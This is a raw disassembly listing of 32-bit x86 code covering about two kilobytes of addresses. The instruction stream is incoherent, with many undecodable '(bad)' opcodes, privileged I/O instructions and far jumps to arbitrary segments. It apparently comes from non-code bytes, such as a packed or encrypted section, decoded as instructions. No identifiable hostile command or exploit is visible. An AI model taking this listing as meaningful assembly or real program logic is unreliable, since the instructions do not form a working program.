  41806d:	ret    
  41806e:	xor    ah,ah
  418070:	shl    DWORD PTR [edx-0x21],cl
  418073:	xchg   edi,eax
  418074:	dec    ecx
  418075:	adc    eax,0xf90e5b75
  41807a:	mov    dl,0xc9
  41807c:	add    dl,BYTE PTR [edx+ebp*1]
  41807f:	push   0xffffff95
  418081:	jg     0x4180c3
  418083:	fsubr  DWORD PTR ds:0x87e1a314
  418089:	arpl   si,ax
  41808b:	test   bl,bh
  41808d:	pop    edx
  41808e:	dec    edx
  41808f:	jbe    0x418023
  418091:	jg     0x4180c4
  418093:	and    eax,0xbf8a07a
  418098:	mov    cl,0x12
  41809a:	mov    edx,DWORD PTR [ebx+0x46]
  41809d:	mov    ah,0x1f
  41809f:	data16 rcr BYTE PTR [esi+0x6a],0x39
  4180a4:	out    0xf4,eax
  4180a6:	and    al,0xcd
  4180a8:	sahf   
  4180a9:	pop    esi
  4180aa:	int3   
  4180ab:	div    al
  4180ad:	retf   0x5de5
  4180b0:	test   eax,esi
  4180b2:	jle    0x4180b9
  4180b4:	sub    ebp,DWORD PTR [ecx+0x57]
  4180b7:	call   0xf10:0xd2ae26bf
  4180be:	mov    cl,0x55
  4180c0:	les    edi,FWORD PTR [ebp-0x77]
  4180c3:	and    bl,BYTE PTR [esi+esi*8]
  4180c6:	adc    ebx,0xd7426f50
  4180cc:	in     eax,0x18
  4180ce:	dec    edx
  4180cf:	sub    dh,dl
  4180d1:	dec    ecx
  4180d2:	popa   
  4180d3:	sbb    eax,0xbe65478
  4180d8:	stos   BYTE PTR es:[edi],al
  4180d9:	and    al,0xab
  4180db:	adc    BYTE PTR [ebp-0x7e],cl
  4180de:	pop    edx
  4180df:	sbb    esi,DWORD PTR [ebx]
  4180e1:	adc    bh,BYTE PTR [ebx-0x432e01c2]
  4180e7:	pop    edi
  4180e8:	(bad)  
  4180e9:	mov    dl,0x31
  4180eb:	jmp    0xf8992678
  4180f0:	shl    DWORD PTR [edi],cl
  4180f2:	sar    edi,cl
  4180f4:	jo     0x41815d
  4180f6:	push   es
  4180f7:	pop    edi
  4180f8:	mov    eax,0x60b136d6
  4180fd:	hlt    
  4180fe:	rcl    DWORD PTR [eax],0x18
  418101:	mov    edx,0xc0b1d28d
  418106:	and    BYTE PTR [esi-0x73],ah
  418109:	mov    esi,0xec810866
  41810e:	mov    ds:0xccea58a9,eax
  418113:	pop    es
  418114:	rcl    ecx,1
  418116:	daa    
  418117:	and    al,ch
  418119:	out    0x36,eax
  41811b:	mov    edx,0x41d55510
  418120:	scas   eax,DWORD PTR es:[edi]
  418121:	sub    BYTE PTR ds:0x3d9ead3c,dh
  418127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418128:	xor    eax,DWORD PTR [esi]
  41812a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41812b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41812c:	lods   eax,DWORD PTR ds:[esi]
  41812d:	call   0x438e234d
  418132:	retf   
  418133:	add    eax,0xbe156f9
  418138:	jp     0x41812f
  41813a:	dec    ecx
  41813b:	int3   
  41813c:	dec    edi
  41813d:	mov    bh,0x98
  41813f:	cdq    
  418140:	xchg   BYTE PTR [eax+edi*1+0x3f],dl
  418144:	ss loope 0x418107
  418147:	sub    edi,edx
  418149:	xor    al,0x32
  41814b:	int    0xa1
  41814d:	cmp    ch,BYTE PTR [ebp+0x27]
  418150:	cdq    
  418151:	rol    BYTE PTR [ebp-0x59ba08d8],0x9a
  418158:	pop    ds
  418159:	pop    ds
  41815a:	or     BYTE PTR [ebx+0x4874c51d],bl
  418160:	xchg   esp,eax
  418161:	mov    es,WORD PTR [edi+edi*1]
  418164:	xchg   ebx,eax
  418165:	xchg   esp,eax
  418166:	pusha  
  418167:	cmp    DWORD PTR [esp+ebx*1-0x33d7cd1a],ebp
  41816e:	mov    esi,0xeacf1209
  418173:	inc    BYTE PTR [eax]
  418175:	adc    al,0xf3
  418177:	mov    ds:0xd2e5ca63,al
  41817c:	arpl   WORD PTR [ebp+0x39],sp
  41817f:	into   
  418180:	std    
  418181:	jbe    0x418152
  418183:	sub    bh,BYTE PTR [edi+0x7d2ac80c]
  418189:	stos   DWORD PTR es:[edi],eax
  41818a:	and    BYTE PTR [edx+0x2d],ah
  41818d:	dec    edi
  41818e:	lods   al,BYTE PTR ds:[esi]
  41818f:	test   bl,0xcc
  418192:	cdq    
  418193:	ret    
  418194:	retf   
  418195:	xchg   esp,eax
  418196:	lock xchg BYTE PTR [ebx+0x25],ah
  41819a:	inc    esp
  41819b:	das    
  41819c:	rcr    DWORD PTR [ecx],0x98
  41819f:	shl    edi,1
  4181a1:	pop    es
  4181a2:	or     al,0x97
  4181a4:	sti    
  4181a5:	sbb    eax,0xbd19a42d
  4181aa:	cmc    
  4181ab:	fcmovnbe st,st(6)
  4181ad:	jmp    0xf553ef5c
  4181b2:	inc    ebx
  4181b3:	out    dx,al
  4181b4:	inc    esp
  4181b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181b6:	stos   BYTE PTR es:[edi],al
  4181b7:	cli    
  4181b8:	out    0xd4,eax
  4181ba:	mov    dl,0x92
  4181bc:	clc    
  4181bd:	into   
  4181be:	test   eax,0x59bfe59e
  4181c3:	jo     0x4181da
  4181c5:	or     BYTE PTR [edx+0x4e],dh
  4181c8:	xchg   ecx,eax
  4181c9:	or     bh,BYTE PTR ds:[edi+ecx*4+0x514e94df]
  4181d1:	fwait
  4181d2:	inc    esi
  4181d3:	mov    WORD PTR [esi+0x74],cs
  4181d6:	jns    0x4181b5
  4181d8:	xor    BYTE PTR [ebp-0x4dae8386],ch
  4181de:	mul    BYTE PTR [eax+0x6cfdec95]
  4181e4:	call   0xe2973793
  4181e9:	(bad)  
  4181ea:	and    BYTE PTR [edx],dl
  4181ec:	xor    BYTE PTR [edi+0x5c6014a4],ch
  4181f2:	adc    eax,0x63fcf7fa
  4181f7:	and    al,BYTE PTR [esi]
  4181f9:	jmp    0xb69a:0x6cbd4d51
  418200:	xor    bh,al
  418202:	mov    esp,0x9d1fd2af
  418207:	xor    DWORD PTR [esi+0x3acb8ff4],ecx
  41820d:	add    BYTE PTR [edi-0x44],cl
  418210:	dec    ebp
  418211:	bound  eax,QWORD PTR [eax+0x68]
  418214:	lods   al,BYTE PTR ds:[esi]
  418215:	(bad)  [esi-0x2a]
  418218:	mov    ebx,0x8a70bb59
  41821d:	outs   dx,DWORD PTR ds:[esi]
  41821e:	rcr    BYTE PTR [edx-0x20],1
  418221:	ror    BYTE PTR [ecx-0x3bbcda74],1
  418227:	adc    al,0xe3
  418229:	loop   0x41827d
  41822b:	mov    gs,WORD PTR ds:0x81dca224
  418231:	(bad)
  418234:	push   ss
  418235:	scas   al,BYTE PTR es:[edi]
  418236:	mov    ds:0x5da3dcd1,eax
  41823b:	mov    ds:0x989da460,al
  418240:	cmp    ecx,DWORD PTR [edx+0x38]
  418243:	inc    ecx
  418244:	sbb    DWORD PTR [edx],0x45ea08f1
  41824a:	add    bh,bl
  41824c:	dec    ecx
  41824d:	and    eax,0x785627fe
  418252:	(bad)  
  418253:	sub    DWORD PTR [esi],esp
  418255:	(bad)  
  418256:	pop    ecx
  418257:	mov    edi,0x53f3aa21
  41825c:	sahf   
  41825d:	int    0xfb
  41825f:	fwait
  418260:	sub    eax,DWORD PTR [edi+edi*8+0x2a]
  418264:	sub    esi,ecx
  418266:	rol    ebx,0xb0
  418269:	data16 loope 0x418243
  41826c:	(bad)  
  41826d:	in     eax,dx
  41826e:	fstp   QWORD PTR [edx+0x6be1ec92]
  418274:	cmp    BYTE PTR [ecx],ah
  418276:	jg     0x4182dc
  418278:	aaa    
  418279:	dec    ecx
  41827a:	clc    
  41827b:	ds nop
  41827d:	lods   al,BYTE PTR ds:[esi]
  41827e:	push   cs
  41827f:	lock sbb BYTE PTR es:[eax-0x681b140c],ah
  418287:	and    bh,bl
  418289:	xchg   ebp,eax
  41828a:	cli    
  41828b:	lods   eax,DWORD PTR ds:[esi]
  41828c:	lea    edx,[edi+0x1e]
  41828f:	aaa    
  418290:	popa   
  418291:	pop    ds
  418292:	mov    ds:0xf2441899,al
  418297:	fadd   DWORD PTR [edi-0x2334aefa]
  41829d:	cmp    al,0x1b
  41829f:	xchg   ebx,ebx
  4182a1:	dec    eax
  4182a2:	lea    ebp,[eax]
  4182a4:	outs   dx,DWORD PTR ds:[esi]
  4182a5:	jne    0x418276
  4182a7:	shr    BYTE PTR [ebp+0x18],0xb5
  4182ab:	ret    0x6cc0
  4182ae:	(bad)  
  4182af:	cmp    BYTE PTR [esi+0x19],dh
  4182b2:	int    0x28
  4182b4:	lock mov al,ds:0xff5fa5e7
  4182ba:	add    bl,BYTE PTR [edx-0x54b36bf3]
  4182c0:	dec    esi
  4182c1:	loopne 0x41826f
  4182c3:	outs   dx,BYTE PTR ds:[esi]
  4182c4:	jge    0x4182d8
  4182c6:	mov    edx,0x48293f6c
  4182cb:	sbb    DWORD PTR [ecx+0x58],eax
  4182ce:	and    BYTE PTR [ecx+0x2b],dl
  4182d1:	popf   
  4182d2:	xchg   esp,eax
  4182d3:	femms  
  4182d5:	lds    edx,FWORD PTR [ebp-0x55285f8e]
  4182db:	ss jecxz 0x418345
  4182de:	inc    ebp
  4182df:	lahf   
  4182e0:	fdivr  DWORD PTR [eax-0x4969b92c]
  4182e6:	sub    ecx,DWORD PTR [eax]
  4182e8:	fistp  QWORD PTR [esi]
  4182ea:	sbb    ebp,DWORD PTR [eax-0x2f15467c]
  4182f0:	(bad)  
  4182f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182f2:	pushf  
  4182f3:	stc    
  4182f4:	dec    edx
  4182f5:	jae    0x418346
  4182f7:	xor    BYTE PTR [edi-0x6ec10963],cl
  4182fd:	cmc    
  4182fe:	sbb    ebp,DWORD PTR ds:0xb9d276d9
  418304:	rcl    edx,1
  418306:	out    dx,eax
  418307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418308:	mov    dl,0x77
  41830a:	push   edx
  41830b:	aas    
  41830c:	test   DWORD PTR [edx+0x6d220b34],edi
  418312:	ja     0x41830a
  418314:	dec    esp
  418315:	adc    BYTE PTR [ebx],dh
  418317:	jp     0x4182d8
  418319:	cwde   
  41831a:	pushf  
  41831b:	add    esi,DWORD PTR [edx-0x2e]
  41831e:	mov    ebx,0x79b79640
  418323:	mov    bl,0x8d
  418325:	xor    DWORD PTR [ebx],0xffffff88
  418328:	cmc    
  418329:	jae    0x418321
  41832b:	ins    BYTE PTR es:[edi],dx
  41832c:	jae    0x4182f0
  41832e:	pop    edx
  41832f:	xor    ch,BYTE PTR [eax+0x57]
  418332:	loop   0x4182e9
  418334:	push   es
  418335:	cmc    
  418336:	gs mov esi,0xbd1dd767
  41833c:	push   esp
  41833d:	xlat   BYTE PTR ds:[ebx]
  41833e:	mov    ds:0x7da3d4e,al
  418343:	sahf   
  418344:	repnz mov WORD PTR [esi],gs
  418347:	call   0x19fa:0xa8b083e9
  41834e:	adc    eax,0xc1bc00c6
  418353:	aas    
  418354:	xchg   ecx,eax
  418355:	and    eax,0xd48888ef
  41835a:	sub    esi,DWORD PTR [esi-0x44]
  41835d:	(bad)  
  41835e:	shl    BYTE PTR [ebp-0x70a59341],cl
  418364:	int    0x74
  418366:	mov    edi,0x6f51dc3a
  41836b:	loop   0x4182f1
  41836d:	sar    DWORD PTR [ecx-0x5e],1
  418370:	ret    0x2a1b
  418373:	setno  dl
  418376:	mov    ds:0x1b851e59,eax
  41837b:	cwde   
  41837c:	push   ebx
  41837d:	mov    edx,0xf890a60d
  418382:	cmp    DWORD PTR fs:[eax-0x44a0d5ea],eax
  418389:	sbb    ecx,ecx
  41838b:	adc    al,0x7
  41838d:	xchg   esi,ebp
  41838f:	xchg   esp,eax
  418390:	lahf   
  418391:	out    0xae,al
  418393:	mov    esp,0xccee3606
  418398:	in     eax,0x5e
  41839a:	lea    edi,[eax-0x69]
  41839d:	xor    bl,BYTE PTR [edx+0x47]
  4183a0:	xchg   ecx,eax
  4183a1:	popa   
  4183a2:	dec    ecx
  4183a3:	shl    DWORD PTR [ebp-0x66],0xcc
  4183a7:	div    edi
  4183a9:	mov    ah,BYTE PTR [esi+0x149929c]
  4183af:	mov    BYTE PTR fs:[edx],ah
  4183b2:	loop   0x418387
  4183b4:	xchg   dl,dl
  4183b6:	inc    ebx
  4183b7:	adc    al,0x22
  4183b9:	aad    0x13
  4183bb:	out    dx,al
  4183bc:	dec    esi
  4183bd:	add    dh,BYTE PTR [edi]
  4183bf:	jmp    0xe374:0xfd8a0b60
  4183c6:	retf   
  4183c7:	ins    BYTE PTR es:[edi],dx
  4183c8:	push   edi
  4183c9:	sar    bh,0x43
  4183cc:	out    dx,eax
  4183cd:	jmp    0x9f64:0xbcd333cf
  4183d4:	and    cl,ah
  4183d6:	jbe    0x418400
  4183d8:	hlt    
  4183d9:	stos   DWORD PTR es:[edi],eax
  4183da:	stos   DWORD PTR es:[edi],eax
  4183db:	xor    al,0x12
  4183dd:	xor    ch,ch
  4183df:	cmp    eax,0xdd660b0b
  4183e4:	popa   
  4183e5:	das    
  4183e6:	int3   
  4183e7:	add    BYTE PTR [edi+0x54],ch
  4183ea:	in     al,0x2d
  4183ec:	call   0xe4bd752c
  4183f1:	scas   al,BYTE PTR es:[edi]
  4183f2:	jnp    0x4183d2
  4183f4:	repz add eax,0xf00f70f0
  4183fa:	cmp    ecx,DWORD PTR [ecx-0x2c]
  4183fd:	mov    bl,BYTE PTR ds:0x7857f4fa
  418403:	shl    BYTE PTR ds:[edi+0x7bea2f26],cl
  41840a:	jmp    0x418454
  41840c:	aam    0xed
  41840e:	fcomp  DWORD PTR [ecx+0x157c709c]
  418414:	mov    esi,0xbc7d71de
  418419:	rol    DWORD PTR [ebx+ecx*1-0x273bfe74],cl
  418420:	xor    eax,0x4db9fc65
  418425:	inc    esi
  418426:	shl    DWORD PTR [esi+0x5e],1
  418429:	push   edx
  41842a:	retf   0xf846
  41842d:	add    eax,DWORD PTR [ecx-0x32]
  418430:	repnz test BYTE PTR [eax],0x7d
  418434:	sbb    BYTE PTR [ebp+0x42],dh
  418437:	mov    DWORD PTR [edx-0x6c],esi
  41843a:	cdq    
  41843b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41843c:	frstor ds:0x31b05b1a
  418442:	inc    ebp
  418443:	cmp    eax,0x64938b8b
  418448:	call   0xac751bb2
  41844d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41844e:	test   DWORD PTR [edi-0x3d852d2f],eax
  418454:	jbe    0x418472
  418456:	add    bh,dl
  418458:	ja     0x4184c7
  41845a:	loopne 0x41849e
  41845c:	dec    esp
  41845d:	push   ds
  41845e:	sbb    cl,BYTE PTR [ebp-0x30]
  418461:	test   BYTE PTR [ecx+0xfc38afd],0x68
  418468:	pop    ebx
  418469:	pop    esp
  41846a:	scas   eax,DWORD PTR es:[edi]
  41846b:	fs jns 0x4184a5
  41846e:	or     eax,0x9af10fc0
  418473:	inc    edx
  418474:	inc    ebp
  418475:	push   ss
  418476:	or     DWORD PTR [edi-0x46fd53f5],edx
  41847c:	mov    cl,0xd6
  41847e:	mov    ds:0x113e530d,al
  418483:	add    BYTE PTR [esi+0xe5b435a],0x65
  41848a:	(bad)  
  41848b:	jno    0x418482
  41848d:	jns    0x418415
  41848f:	push   ecx
  418490:	fnstsw WORD PTR [ebx]
  418492:	idiv   DWORD PTR [ebx]
  418494:	mov    DWORD PTR [ecx],esi
  418496:	cmc    
  418497:	rcl    DWORD PTR [edx],0x55
  41849a:	arpl   dx,di
  41849c:	dec    BYTE PTR [edx-0xc]
  41849f:	scas   al,BYTE PTR es:[edi]
  4184a0:	jmp    0x418456
  4184a2:	or     BYTE PTR [ebp+0x7684754e],ah
  4184a8:	(bad)
  4184ab:	pop    ss
  4184ac:	xor    BYTE PTR [edx+0x60],cl
  4184af:	mov    ecx,0xd41b4f77
  4184b4:	sub    BYTE PTR [edx-0x12cdb371],dh
  4184ba:	sub    al,0x6
  4184bc:	fwait
  4184bd:	retf   
  4184be:	sub    eax,0x960248e2
  4184c3:	imul   edx,DWORD PTR [esi],0xfebcc0c7
  4184c9:	xchg   ebx,eax
  4184ca:	iret   
  4184cb:	mov    ch,dl
  4184cd:	adc    ebx,DWORD PTR [ebp-0x3d]
  4184d0:	xchg   esp,eax
  4184d1:	bound  eax,QWORD PTR [ecx-0x2]
  4184d4:	lea    edi,[ebp+0x27]
  4184d7:	mov    ds:0x4818bb6e,eax
  4184dc:	ror    bh,cl
  4184de:	inc    ebp
  4184df:	out    0x3a,al
  4184e1:	nop
  4184e2:	push   ecx
  4184e3:	inc    esp
  4184e4:	imul   esp,DWORD PTR [edx-0x50],0x52
  4184e8:	adc    dl,dl
  4184ea:	loop   0x418534
  4184ec:	add    BYTE PTR [edx-0x80],ah
  4184ef:	inc    ebp
  4184f0:	xor    eax,0x9742716e
  4184f5:	cmp    al,dh
  4184f7:	mov    eax,0x55f191a5
  4184fc:	mul    DWORD PTR ds:0xd22fcdd3
  418502:	push   ds
  418503:	push   esi
  418504:	cmp    cl,BYTE PTR [eax-0x32]
  418507:	sub    eax,0x72a63604
  41850c:	jmp    0x76fc:0xb798afa2
  418513:	in     eax,dx
  418514:	mov    ah,al
  418516:	sbb    al,0x2c
  418518:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418519:	ds jb  0x41855d
  41851c:	(bad)  
  41851d:	push   ecx
  41851e:	sub    eax,0xbf369a13
  418523:	ficomp WORD PTR [ecx+ebx*8]
  418526:	sub    BYTE PTR [ecx+0x3],al
  418529:	mov    ch,0xe3
  41852b:	cmc    
  41852c:	xor    al,0xff
  41852e:	pop    ss
  41852f:	je     0x4184da
  418531:	sub    DWORD PTR [eax-0x8],ebx
  418534:	pop    ss
  418535:	mov    esp,0xb41d7ed9
  41853a:	mov    eax,ds:0xbbf660fe
  41853f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418540:	mov    esp,0x4d60e59f
  418545:	lahf   
  418546:	mov    dl,0x41
  418548:	adc    eax,0xbf2b71a4
  41854d:	cmp    al,0x57
  41854f:	mov    eax,ds:0xafe5bcb1
  418554:	xor    DWORD PTR ds:0xe021d3fe,edx
  41855a:	xchg   esi,eax
  41855b:	arpl   WORD PTR [edi+0x75],dx
  41855e:	gs mov al,0x92
  418561:	test   ch,bl
  418563:	ret    
  418564:	sub    cl,BYTE PTR [edi]
  418566:	mov    dh,0xfe
  418568:	and    al,0x1f
  41856a:	cwde   
  41856b:	inc    ecx
  41856c:	inc    edi
  41856d:	or     BYTE PTR [edi+0x5f],dl
  418570:	or     BYTE PTR [eax],0x40
  418573:	daa    
  418574:	pop    ebp
  418575:	imul   edi,DWORD PTR ds:0xe3082a6c,0x53291a21
  41857f:	add    BYTE PTR [eax+ebp*8+0x3bc38902],cl
  418586:	mov    ebx,0xcab3e058
  41858b:	rcl    BYTE PTR [edx-0x3b],cl
  41858e:	push   edi
  41858f:	xchg   esi,eax
  418590:	ret    
  418591:	mov    bh,0x55
  418593:	jae    0x4185e5
  418595:	dec    esi
  418596:	out    dx,al
  418597:	jmp    0x1f681d38
  41859c:	sub    al,0x44
  41859e:	cmp    DWORD PTR [edi+0x121533db],eax
  4185a4:	out    0x5f,eax
  4185a6:	stos   BYTE PTR es:[edi],al
  4185a7:	inc    esi
  4185a8:	stc    
  4185a9:	and    edi,DWORD PTR [ecx]
  4185ab:	les    ecx,FWORD PTR [edx]
  4185ad:	mov    ecx,0x53fce76c
  4185b2:	mov    dl,0x5e
  4185b4:	pusha  
  4185b5:	inc    edi
  4185b6:	dec    eax
  4185b7:	jmp    0x23047cf4
  4185bc:	sub    eax,0xce07f8d
  4185c1:	adc    ecx,ebp
  4185c3:	loopne 0x418622
  4185c5:	pop    ecx
  4185c6:	jmp    0x418627
  4185c8:	lods   eax,DWORD PTR ds:[esi]
  4185c9:	adc    eax,0x42c6e55a
  4185ce:	or     eax,DWORD PTR [ebx+eax*8+0x246f555d]
  4185d5:	sub    dh,BYTE PTR ds:0x67b38751
  4185db:	adc    BYTE PTR [ebp+0x54a432c4],bl
  4185e1:	aam    0xcd
  4185e3:	and    ecx,DWORD PTR [esi]
  4185e5:	dec    ecx
  4185e6:	loope  0x41858e
  4185e8:	jns    0x4185a2
  4185ea:	mov    dh,BYTE PTR cs:[ebx]
  4185ed:	ja     0x4185e2
  4185ef:	add    DWORD PTR [edi+0x1c15eb01],edx
  4185f5:	pop    esp
  4185f6:	pop    ss
  4185f7:	push   esp
  4185f8:	nop
  4185f9:	ror    eax,0x3a
  4185fc:	add    ah,BYTE PTR [ecx+ecx*2-0x11]
  418600:	repz enter 0xe0c5,0xb1
  418605:	jns    0x418644
  418607:	cdq    
  418608:	and    esp,DWORD PTR [ebx]
  41860a:	push   cs
  41860b:	push   ebx
  41860c:	sbb    dh,BYTE PTR [edi]
  41860e:	sbb    edx,DWORD PTR [edx+0x69]
  418611:	inc    ebp
  418612:	mov    ebp,0x7c7b58a0
  418617:	ja     0x418697
  418619:	jg     0x418671
  41861b:	cs fwait
  41861d:	xor    eax,0xa63f9f34
  418622:	psraw  mm4,mm0
  418625:	cmc    
  418626:	adc    al,0xde
  418628:	dec    eax
  418629:	mov    edx,0xd04e4298
  41862e:	push   ds
  41862f:	and    eax,0x68921f6a
  418634:	xchg   esp,eax
  418635:	addr16 push edi
  418637:	adc    ebp,DWORD PTR [ebx+0x18]
  41863a:	sti    
  41863b:	or     al,cl
  41863d:	(bad)  
  41863f:	outs   dx,BYTE PTR ds:[esi]
  418640:	push   0x33aa0ba1
  418645:	retf   0x3d5f
  418648:	scas   eax,DWORD PTR es:[edi]
  418649:	fild   DWORD PTR [edi]
  41864b:	(bad)  
  41864d:	push   es
  41864e:	sahf   
  41864f:	lock mov ds:0x21d4709f,al
  418655:	aam    0xa5
  418657:	test   eax,0xd226c3ce
  41865c:	retf   
  41865d:	cmp    dh,BYTE PTR [ebp+0x3b]
  418660:	pop    es
  418661:	adc    ecx,DWORD PTR gs:[ecx+esi*8-0x65]
  418666:	pop    es
  418667:	fwait
  418668:	mov    bl,0x0
  41866a:	lahf   
  41866b:	mov    dl,0x30
  41866d:	sbb    dl,BYTE PTR [esi+0x5]
  418670:	xchg   edi,eax
  418671:	sub    BYTE PTR [eax+0x47],dl
  418674:	adc    cl,dh
  418676:	mov    bh,0x16
  418678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418679:	jmp    0x418699
  41867b:	mov    ch,BYTE PTR [eax]
  41867d:	jb     0x418621
  41867f:	enter  0x30b2,0x60
  418683:	dec    eax
  418684:	(bad)  
  418685:	aad    0x12
  418687:	push   ds
  418688:	(bad)  
  418689:	sub    DWORD PTR [edx-0x54],esi
  41868c:	(bad)  
  41868d:	lods   al,BYTE PTR ds:[esi]
  41868e:	jmp    0xf736:0xd2ac6abb
  418695:	call   0x2e9a2857
  41869a:	in     eax,dx
  41869b:	add    BYTE PTR [esp+edx*2],bh
  41869e:	(bad)  
  4186a0:	or     esp,DWORD PTR [ebx-0x3e5e5234]
  4186a6:	push   ebx
  4186a7:	push   ecx
  4186a8:	pop    edi
  4186a9:	xchg   esi,eax
  4186aa:	jp     0x4186ea
  4186ac:	test   eax,0x771ddada
  4186b1:	inc    ebx
  4186b2:	scas   al,BYTE PTR es:[edi]
  4186b3:	stos   BYTE PTR es:[edi],al
  4186b4:	in     eax,0x28
  4186b6:	popa   
  4186b7:	aam    0xfe
  4186b9:	hlt    
  4186ba:	jbe    0x418644
  4186bc:	jmp    0x175c1401
  4186c1:	push   0xffffffed
  4186c3:	sbb    ebp,0x3a
  4186c6:	sti    
  4186c7:	popf   
  4186c8:	pop    esp
  4186c9:	or     al,BYTE PTR [edi+ebx*1-0x2]
  4186cd:	jb     0x41868d
  4186cf:	sub    eax,0xdb2f9151
  4186d4:	pop    edi
  4186d5:	std    
  4186d6:	push   edi
  4186d7:	fisttp WORD PTR [ecx+eax*2]
  4186da:	pop    edi
  4186db:	or     dl,al
  4186dd:	mov    dh,0x18
  4186df:	mov    edi,0xe838d32b
  4186e4:	mov    esi,0x47424cfa
  4186e9:	mov    eax,0xe36e0fd3
  4186ee:	out    dx,al
  4186ef:	inc    ecx
  4186f0:	mov    ebx,0x717c4912
  4186f5:	pop    esp
  4186f6:	xlat   BYTE PTR es:[ebx]
  4186f8:	fdivrp st(3),st
  4186fa:	fsqrt  
  4186fc:	push   edi
  4186fd:	jae    0x4186e0
  4186ff:	fiadd  DWORD PTR [edi]
  418701:	ins    BYTE PTR es:[edi],dx
  418702:	outs   dx,DWORD PTR ds:[esi]
  418703:	mov    WORD PTR [edx],es
  418705:	inc    esi
  418706:	sub    BYTE PTR [edx],0x61
  418709:	dec    ebp
  41870a:	and    ebp,DWORD PTR [edi+0x2e]
  41870d:	pop    edx
  41870e:	(bad)  
  41870f:	call   0xcfdb:0x432001e9
  418716:	jbe    0x418720
  418718:	sbb    al,0x9f
  41871a:	push   ecx
  41871b:	cli    
  41871c:	stos   DWORD PTR es:[edi],eax
  41871d:	(bad)  
  41871e:	or     al,0xbe
  418720:	(bad)  
  418721:	enter  0x558a,0x9f
  418725:	push   eax
  418726:	retf   
  418727:	dec    ebx
  418728:	cmp    eax,0x57e7ba02
  41872d:	pop    ebx
  41872e:	repz sub ah,ah
  418731:	xchg   DWORD PTR [ebx-0x4d352ad1],ecx
  418737:	sbb    al,0xd4
  418739:	jecxz  0x418734
  41873b:	mov    bl,0xf4
  41873d:	das    
  41873e:	inc    eax
  41873f:	pop    esp
  418740:	(bad)  
  418741:	adc    esp,DWORD PTR [ebp-0x18db4e74]
  418747:	es xchg ecx,eax
  418749:	mov    cl,0xc2
  41874b:	ja     0x418707
  41874d:	les    esp,FWORD PTR [ecx-0x5bdc45bc]
  418753:	pop    esp
  418754:	stos   DWORD PTR es:[edi],eax
  418755:	push   ds
  418756:	xchg   bh,dl
  418758:	mov    al,ds:0xba721470
  41875d:	mov    eax,0xbed0dd63
  418762:	imul   eax,DWORD PTR [ecx-0x7ed1ce18],0xfffffffb
  418769:	pop    ecx
  41876a:	sub    ebx,DWORD PTR [ebp*8-0x7a83ec4]
  418771:	scas   eax,DWORD PTR es:[edi]
  418772:	js     0x418715
  418774:	jmp    0x4540:0x522ba3ab
  41877b:	daa    
  41877c:	(bad)  [ebx-0x227ec8cb]
  418782:	and    ecx,DWORD PTR [ecx+ebp*2]
  418785:	mov    edx,0x4573c76c
  41878a:	fnstsw WORD PTR [edx-0x50]
  41878d:	mov    ebx,0x427114be
  418792:	mov    ax,0xce3f
  418796:	jg     0x418797
  418798:	inc    ebp
  418799:	mov    esp,0x5bf6ea53
  41879e:	xor    BYTE PTR [esi+0x4b],ah
  4187a1:	je     0x4187d9
  4187a3:	xchg   esi,eax
  4187a4:	popf   
  4187a5:	dec    esp
  4187a6:	enter  0xc63d,0xb9
  4187aa:	inc    esi
  4187ab:	jle    0x4187a4
  4187ad:	and    BYTE PTR [eax+0x73b49e19],dl
  4187b3:	mov    cs,WORD PTR [ebx-0x21]
  4187b6:	add    BYTE PTR [esi],cl
  4187b8:	mov    edi,0x2c532e3e
  4187bd:	data16 hlt 
  4187bf:	or     ch,BYTE PTR [ebx-0x2a018b79]
  4187c5:	jno    0x41882a
  4187c7:	add    al,0x5e
  4187c9:	popa   
  4187ca:	aam    0x31
  4187cc:	int3   
  4187cd:	imul   ebx,DWORD PTR [ecx-0x55],0xff180b23
  4187d4:	test   DWORD PTR [ecx+edx*2+0x1a],edx
  4187d8:	mov    eax,ds:0xd701ee82
  4187dd:	mov    ebx,0xf175497b
  4187e2:	out    dx,eax
  4187e3:	adc    cl,bl
  4187e5:	ja     0x4187f1
  4187e7:	es jge 0x41877a
  4187ea:	jl     0x4187d6
  4187ec:	sbb    dh,BYTE PTR [ebx-0x8b377f9]
  4187f2:	xchg   edi,eax
  4187f3:	les    ebp,FWORD PTR [ecx+eiz*4]
  4187f6:	mov    esi,DWORD PTR [esi]
  4187f8:	sbb    BYTE PTR [ebp+esi*4-0x49],al
  4187fc:	xchg   esi,eax
  4187fd:	dec    edi
  4187fe:	ins    BYTE PTR es:[edi],dx
  4187ff:	jg     0x4187fd
  418801:	clc    
  418802:	ins    BYTE PTR es:[edi],dx
  418803:	mov    eax,0x9439930f
  418808:	cmp    DWORD PTR [ebx],0x35
  41880b:	adc    BYTE PTR [esi+0x49],dh
  41880e:	sbb    DWORD PTR [ecx+ecx*2],ecx
  418811:	retf   
  418812:	out    0x98,eax
  418814:	inc    edi
  418815:	sbb    ebp,DWORD PTR [ebx+0x60]
  418818:	xor    al,0x21
  41881a:	mov    dl,BYTE PTR [ebx+0x722c3e29]
  418820:	add    eax,0x88b2589f
  418825:	out    0xfb,eax
  418827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418828:	mov    esp,0x4d285ec4
  41882d:	cmp    al,0x98
  41882f:	mov    ecx,0xeb1a1d17
  418834:	xor    al,0x82
  418836:	sub    bl,BYTE PTR [esi+0x2e3cec8]
  41883c:	mov    al,ds:0x8ed540f4
  418841:	jecxz  0x418892
  418843:	retf   0xe4c5
  418846:	or     ebx,DWORD PTR [esi-0x33]
  418849:	xchg   edi,eax
  41884a:	pop    ss
  41884b:	mov    ebp,0x81877c83
  418850:	jl     0x41886a
  418852:	xchg   DWORD PTR [ecx],edi
  418854:	and    eax,0x666fbf36
  418859:	push   0x34
  41885b:	mov    esi,0x53e53599
  418860:	lods   eax,DWORD PTR ds:[esi]
  418861:	out    dx,al
  418862:	ret    0x7b06
  418865:	popa   
  418866:	mov    ah,al
